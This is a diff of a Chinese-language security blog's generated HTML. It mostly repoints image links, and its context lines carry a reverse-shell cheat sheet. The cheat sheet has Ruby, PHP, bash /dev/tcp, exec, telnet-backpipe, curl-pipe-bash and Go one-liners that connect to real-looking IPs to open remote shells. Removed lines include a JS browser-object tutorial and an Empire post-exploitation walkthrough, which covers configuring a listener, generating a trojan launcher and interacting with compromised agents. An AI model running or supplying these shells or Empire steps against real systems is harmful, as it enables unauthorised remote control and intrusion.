+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201228150753311.png" alt="image-20201228150753311"></p>
 <h2 id="ruby反弹-错误的文件描述符"><a href="#ruby反弹-错误的文件描述符" class="headerlink" title="ruby反弹(错误的文件描述符)"></a>ruby反弹(错误的文件描述符)</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ruby -r socket -e &#x27;f=TCPSocket.open(&quot;47.92.***.***&quot;,2333).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></pre></td></tr></table></figure>
 
 <h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#39;exit if</span><br><span class="line">fork;c&#x3D;TCPSocket.new(&quot;ip&quot;,&quot;port&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)</span><br><span class="line">&#123;|io|c.print io.read&#125;end&#39;</span><br></pre></td></tr></table></figure>
@@ -581,11 +893,11 @@
 
 <h2 id="exec反弹"><a href="#exec反弹" class="headerlink" title="exec反弹"></a>exec反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/47.92.137.130/2333; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228153800396.png" alt="image-20201228153800396"></p>
-<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228153817676.png" alt="image-20201228153817676"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201228153800396.png" alt="image-20201228153800396"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201228153817676.png" alt="image-20201228153817676"></p>
 <h2 id="lua反弹-无法安装luasocket模块"><a href="#lua反弹-无法安装luasocket模块" class="headerlink" title="lua反弹(无法安装luasocket模块)"></a>lua反弹(无法安装luasocket模块)</h2><h3 id="lua安装"><a href="#lua安装" class="headerlink" title="lua安装"></a>lua安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -R -O http://www.lua.org/ftp/lua-5.4.2.tar.gz</span><br><span class="line">tar zxf lua-5.4.2.tar.gz</span><br><span class="line">cd lua-5.4.2</span><br><span class="line">make all test</span><br><span class="line">make linux test </span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
 
-<h3 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h3><p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228160031878.png" alt="image-20201228160031878"></p>
+<h3 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h3><p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201228160031878.png" alt="image-20201228160031878"></p>
 <p>说明我们安装的luasocket位置，从错误提示可以看出</p>
 <p>.lua文件它是从/usr/local/share/lua路径中查找</p>
 <p>.so 文件是从/usr/local/lib/lua 路径查找</p>
@@ -612,8 +924,8 @@
 
 <h2 id="telnet反弹"><a href="#telnet反弹" class="headerlink" title="telnet反弹"></a>telnet反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201229095332683.png" alt="image-20201229095332683"></p>
-<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201229095347247.png" alt="image-20201229095347247"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201229095332683.png" alt="image-20201229095332683"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201229095347247.png" alt="image-20201229095347247"></p>
 <p>两个端口，一个输入，一个输出</p>
 <p>监听端</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netcat: nc -nvvp 8000</span><br><span class="line">netcat: nc -nvvp 7000</span><br></pre></td></tr></table></figure>
@@ -628,8 +940,8 @@
 
 <h2 id="php反弹"><a href="#php反弹" class="headerlink" title="php反弹"></a>php反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;47.92.137.130&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201229095856826.png" alt="image-20201229095856826"></p>
-<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201229095920936.png" alt="image-20201229095920936"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201229095856826.png" alt="image-20201229095856826"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201229095920936.png" alt="image-20201229095920936"></p>
 <h2 id="ssh反弹"><a href="#ssh反弹" class="headerlink" title="ssh反弹"></a>ssh反弹</h2><h2 id="Curl反弹"><a href="#Curl反弹" class="headerlink" title="Curl反弹"></a>Curl反弹</h2><p>开启apache服务，把bash命令写入html文件，只要文本包含bash一句话即可。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.2.103&#x2F;bash.html|bash #利用管道符将文件内容作为参数进行传递</span><br><span class="line">#把bash命令写入html文件</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.99.2&#x2F;4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
@@ -639,8 +951,8 @@
 
 
 
-<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201229101723982.png" alt="image-20201229101723982"></p>
-<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201229101737511.png" alt="image-20201229101737511"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201229101723982.png" alt="image-20201229101723982"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-30-shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/image-20201229101737511.png" alt="image-20201229101737511"></p>
 <h2 id="Crontab反弹（计划任务）"><a href="#Crontab反弹（计划任务）" class="headerlink" title="Crontab反弹（计划任务）"></a>Crontab反弹（计划任务）</h2><h2 id="ICMP反弹"><a href="#ICMP反弹" class="headerlink" title="ICMP反弹"></a>ICMP反弹</h2><h2 id="golang反弹"><a href="#golang反弹" class="headerlink" title="golang反弹"></a>golang反弹</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&#x27;...&#x27;</span> &gt; /tmp/t.<span class="keyword">go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main;</span><br><span class="line"><span class="keyword">import</span><span class="string">&quot;os/exec&quot;</span>;</span><br><span class="line"><span class="keyword">import</span><span class="string">&quot;net&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    c,_:=net.Dial(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;192.168.0.1:65535&quot;</span>);</span><br><span class="line">    cmd:=exec.Command(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">    cmd.Stdin=c;</span><br><span class="line">    cmd.Stdout=c;</span><br><span class="line">    cmd.Stderr=c;</span><br><span class="line">    cmd.Run()&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
@@ -932,411 +1244,6 @@
 
 
   
-    <article id="post-JS-窃格瓦拉" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/04/JS-%E7%AA%83%E6%A0%BC%E7%93%A6%E6%8B%89/">JS-窃格瓦拉</a>
-    </h1>
-  
-
-        
-        <a href="/2020/11/04/JS-%E7%AA%83%E6%A0%BC%E7%93%A6%E6%8B%89/" class="archive-article-date">
-  	<time datetime="2020-11-04T03:17:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Navigator-对象包含有关浏览器的信息。"><a href="#Navigator-对象包含有关浏览器的信息。" class="headerlink" title="Navigator 对象包含有关浏览器的信息。"></a>Navigator 对象包含有关浏览器的信息。</h1><p>Navigator 对象属性：</p>
-<table>
-<thead>
-<tr>
-<th>属性</th>
-<th>描述</th>
-<th>IE</th>
-<th>F</th>
-<th>O</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><a target="_blank" rel="noopener" href="http://www.w3school.com.cn/htmldom/prop_nav_appcodename.asp">appCodeName</a></td>
-<td>返回浏览器的代码名。</td>
-<td>4</td>
-<td>1</td>
-<td>9</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://www.w3school.com.cn/htmldom/prop_nav_appminorversion.asp">appMinorVersion</a></td>
-<td>返回浏览器的次级版本。</td>
-<td>4</td>
-<td>No</td>
-<td>No</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://www.w3school.com.cn/htmldom/prop_nav_appname.asp">appName</a></td>
-<td>返回浏览器的名称。</td>
-<td>4</td>
-<td>1</td>
-<td>9</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://www.w3school.com.cn/htmldom/prop_nav_appversion.asp">appVersion</a></td>
-<td>返回浏览器的平台和版本信息。</td>
-<td>4</td>
-<td>1</td>
-<td>9</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://www.w3school.com.cn/htmldom/prop_nav_browserlanguage.asp">browserLanguage</a></td>
-<td>返回当前浏览器的语言。</td>
-<td>4</td>
-<td>No</td>
-<td>9</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://www.w3school.com.cn/htmldom/prop_nav_cookieenabled.asp">cookieEnabled</a></td>
-<td>返回指明浏览器中是否启用 cookie 的布尔值。</td>
-<td>4</td>
-<td>1</td>
-<td>9</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://www.w3school.com.cn/htmldom/prop_nav_cpuclass.asp">cpuClass</a></td>
-<td>返回浏览器系统的 CPU 等级。</td>
-<td>4</td>
-<td>No</td>
-<td>No</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://www.w3school.com.cn/htmldom/prop_nav_online.asp">onLine</a></td>
-<td>返回指明系统是否处于脱机模式的布尔值。</td>
-<td>4</td>
-<td>No</td>
-<td>No</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://www.w3school.com.cn/htmldom/prop_nav_platform.asp">platform</a></td>
-<td>返回运行浏览器的操作系统平台。</td>
-<td>4</td>
-<td>1</td>
-<td>9</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://www.w3school.com.cn/htmldom/prop_nav_systemlanguage.asp">systemLanguage</a></td>
-<td>返回 OS 使用的默认语言。</td>
-<td>4</td>
-<td>No</td>
-<td>No</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://www.w3school.com.cn/htmldom/prop_nav_useragent.asp">userAgent</a></td>
-<td>返回由客户机发送服务器的 user-agent 头部的值。</td>
-<td>4</td>
-<td>1</td>
-<td>9</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://www.w3school.com.cn/htmldom/prop_nav_userlanguage.asp">userLanguage</a></td>
-<td>返回 OS 的自然语言设置。</td>
-<td>4</td>
-<td>No</td>
-<td>9</td>
-</tr>
-</tbody></table>
-<p>Navigator 对象方法：</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>描述</th>
-<th>IE</th>
-<th>F</th>
-<th align="center">O</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><a target="_blank" rel="noopener" href="http://www.w3school.com.cn/htmldom/met_nav_javaenabled.asp">javaEnabled()</a></td>
-<td>规定浏览器是否启用 Java。</td>
-<td>4</td>
-<td>1</td>
-<td align="center">9</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://www.w3school.com.cn/htmldom/met_nav_taintenabled.asp">taintEnabled()</a></td>
-<td>规定浏览器是否启用数据污点 (data tainting)。</td>
-<td>4</td>
-<td>1</td>
-<td align="center">9</td>
-</tr>
-</tbody></table>
-<p>示例：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>如果启用了 Java，则 javaEnabled() 方法返回 true：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">&quot;demo&quot;</span>).innerHTML =</span></span><br><span class="line"><span class="javascript"><span class="string">&quot;javaEnabled 是：&quot;</span> + navigator.javaEnabled();</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="windows-location部分"><a href="#windows-location部分" class="headerlink" title="windows.location部分"></a>windows.location部分</h1><h2 id="window-location-href"><a href="#window-location-href" class="headerlink" title="window.location.href　"></a>window.location.href　</h2><p>整个URl字符串(在浏览器中就是完整的地址栏)</p>
-<p>例子：<a target="_blank" rel="noopener" href="http://baidu.com/">http://baidu.com</a></p>
-<h2 id="window-location-protocol"><a href="#window-location-protocol" class="headerlink" title="window.location.protocol"></a>window.location.protocol</h2><p>访问协议部分</p>
-<p>例子：http:</p>
-<h2 id="window-location-host"><a href="#window-location-host" class="headerlink" title="window.location.host"></a>window.location.host</h2><p>　URL 的主机部分，</p>
-<p>　返回值：<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a></p>
-<h2 id="window-location-port"><a href="#window-location-port" class="headerlink" title="window.location.port"></a>window.location.port</h2><p>　URL 的端口部分。如果采用默认的80端口(update:即使添加了:80)，那么返回值并不是默认的80而是空字符。</p>
-<p>　本例返回值:空</p>
-<h2 id="window-location-pathname"><a href="#window-location-pathname" class="headerlink" title="window.location.pathname"></a>window.location.pathname</h2><p>　URL 的路径部分(就是文件地址)</p>
-<p>　返回值：/index.asp</p>
-<h2 id="window-location-search"><a href="#window-location-search" class="headerlink" title="window.location.search"></a>window.location.search</h2><p>　查询(参数)部分。除了给动态语言赋值以外，我们同样可以给静态页面,并使用javascript来获得相信应的参数值</p>
-<p>　返回值：?id=209</p>
-<h2 id="window-location-hash"><a href="#window-location-hash" class="headerlink" title="window.location.hash"></a>window.location.hash</h2><p>　锚点</p>
-<p>　返回值：#asp</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">JS</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">浏览器，开发</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/11/04/JS-%E7%AA%83%E6%A0%BC%E7%93%A6%E6%8B%89/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-python-导出项目依赖" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/02/python-%E5%AF%BC%E5%87%BA%E9%A1%B9%E7%9B%AE%E4%BE%9D%E8%B5%96/">python-导出项目依赖</a>
-    </h1>
-  
-
-        
-        <a href="/2020/11/02/python-%E5%AF%BC%E5%87%BA%E9%A1%B9%E7%9B%AE%E4%BE%9D%E8%B5%96/" class="archive-article-date">
-  	<time datetime="2020-11-02T04:33:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><p>平时导出依赖一般都是 <code>pip freeze &gt; requirements.txt </code></p>
-<p>这种方法会导出所有当前python环境的包，只会多，不会少</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/11/02/python-%E5%AF%BC%E5%87%BA%E9%A1%B9%E7%9B%AE%E4%BE%9D%E8%B5%96/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Empire-后渗透测试工具" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/02/Empire-%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/">Empire-后渗透测试工具</a>
-    </h1>
-  
-
-        
-        <a href="/2020/11/02/Empire-%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" class="archive-article-date">
-  	<time datetime="2020-11-02T03:30:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="安装命令"><a href="#安装命令" class="headerlink" title="安装命令"></a>安装命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;EmpireProject&#x2F;Empire.git</span><br></pre></td></tr></table></figure>
-
-
-
-<p>各python模块安装</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">每次pip后都需要 sudo ./reset.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">报错：ImportError: No module named xlutils.copy</span></span><br><span class="line">pip install xlutils</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">报错：ImportError: No module named Crypto.Cipher</span></span><br><span class="line">pip install pycrypto</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">报错：ImportError: No module named pyminifier</span></span><br><span class="line">pip install pyminifier</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="安装M2Crypto"><a href="#安装M2Crypto" class="headerlink" title="安装M2Crypto"></a>安装M2Crypto</h4><p>若要<em>安装</em>M2Crypto，您必须能够根据 Python 和 OpenSSL 标头/库编译和链接 C 源。例如，在基于 Debian 的系统中，需要以下包：</p>
-<ul>
-<li><code>build-essential</code></li>
-<li><code>python3-dev</code>和/或<code>python-dev</code></li>
-<li><code>libssl-dev</code></li>
-<li><code>swig 2.0.4</code>或较新的（安装也可以在一些</li>
-</ul>
-<p>具有 swig v1.*的特定旧系统</p>
-<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h3 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Commands</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">agents            Jump to the Agents menu.</span><br><span class="line">creds             Add&#x2F;display credentials to&#x2F;from the database.</span><br><span class="line">exit              Exit Empire</span><br><span class="line">help              Displays the help menu.</span><br><span class="line">interact          Interact with a particular agent.</span><br><span class="line">list              Lists active agents or listeners.</span><br><span class="line">listeners         Interact with active listeners.</span><br><span class="line">load              Loads Empire modules from a non-standard folder.</span><br><span class="line">plugin            Load a plugin file to extend Empire.</span><br><span class="line">plugins           List all available and active plugins.</span><br><span class="line">preobfuscate      Preobfuscate PowerShell module_source files</span><br><span class="line">reload            Reload one (or all) Empire modules.</span><br><span class="line">report            Produce report CSV and log files: sessions.csv, credentials.csv, master.log</span><br><span class="line">reset             Reset a global option (e.g. IP whitelists).</span><br><span class="line">resource          Read and execute a list of Empire commands from a file.</span><br><span class="line">searchmodule      Search Empire module names&#x2F;descriptions.</span><br><span class="line">set               Set a global option (e.g. IP whitelists).</span><br><span class="line">show              Show a global option (e.g. IP whitelists).</span><br><span class="line">usemodule         Use an Empire module.</span><br><span class="line">usestager         Use an Empire stager.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="监听使用"><a href="#监听使用" class="headerlink" title="监听使用"></a>监听使用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">(Empire)&gt;</span><span class="bash"> listeners     <span class="comment"># 监听</span></span></span><br><span class="line">(Empire: listeners) &gt; uselistener http   #选择监听方式</span><br><span class="line">(Empire: listeners/http) &gt; info     #查看需要配置的选项</span><br><span class="line">(Empire: listeners/http) &gt; set Name backdoor    #设置监听名字</span><br><span class="line">(Empire: listeners/http) &gt; set Host http://192.168.80.131:4447             #设置木马反弹回连地址</span><br><span class="line">(Empire: listeners/http) &gt; set Port 4447 #设置本地监听端口</span><br><span class="line">(Empire: listeners/http) &gt; back #返回上层模块</span><br><span class="line">(Empire: listeners) &gt; usestager windows/launcher_bat backdoor  # 选择木马种类</span><br><span class="line">(Empire: stager/windows/launcher_bat) &gt; info     #查看需要配置的 -----可以set OutFile 到你指定的目录（绝对路径）</span><br><span class="line">(Empire: stager/windows/launcher_bat) &gt; execute  #执行生成木马</span><br><span class="line">(Empire: stager/windows/launcher_bat) &gt; agents   #查看获取的代理会话</span><br><span class="line">(Empire: agents) &gt; rename HZFT7AX1 win7pro #更改会话名字</span><br><span class="line">(Empire: agents) &gt; interact win7pro    #和该会话交互</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="监听器部分"><a href="#监听器部分" class="headerlink" title="监听器部分"></a>监听器部分</h3><p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-02-Empire-%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/image-20201101170327608.png" alt="image-20201101170327608"></p>
-<h3 id="木马生成部分"><a href="#木马生成部分" class="headerlink" title="木马生成部分"></a>木马生成部分</h3><p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-02-Empire-%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/image-20201101171314995.png" alt="image-20201101171314995"></p>
-<h3 id="木马监听部分"><a href="#木马监听部分" class="headerlink" title="木马监听部分"></a>木马监听部分</h3><p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-02-Empire-%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/image-20201101183922578.png" alt="image-20201101183922578"></p>
-<h3 id="会话交互"><a href="#会话交互" class="headerlink" title="会话交互"></a>会话交互</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rename  E8FSHDVY win10  <span class="comment">#修改会话名称</span></span><br><span class="line">interact win10 <span class="comment">#进入会话交互</span></span><br></pre></td></tr></table></figure>
-
